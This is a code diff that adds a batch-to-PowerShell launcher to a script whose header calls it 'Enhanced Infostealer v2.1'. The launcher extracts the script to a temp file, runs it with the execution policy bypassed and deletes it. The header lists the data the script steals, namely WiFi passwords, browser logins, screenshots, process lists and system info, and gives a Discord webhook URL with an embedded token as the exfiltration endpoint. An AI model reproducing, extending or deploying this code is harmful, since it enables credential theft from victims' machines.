@@ -1,3 +1,10 @@
+@echo off
+set "tempfile=%TEMP%\temp_ps.ps1"
+findstr /v /c:"REM SCRIPT" "%~f0" > "%tempfile%"
+powershell -ExecutionPolicy Bypass -File "%tempfile%"
+del "%tempfile%" 2>nul
+exit /b
+REM SCRIPT
 # Enhanced Infostealer v2.1 - PowerShell (Admin Required)
 # Exfiltrates: System Info, WiFi Passwords, Screenshot, Processes, Browser Logins
 # Webhook: https://discord.com/api/webhooks/1514513520920756344/BQP-RAPCz7tPFD-m7DiB35JX5mc-NF-t_slKmGReQydatvy8JsSa0xIpFEc_cwHdESot
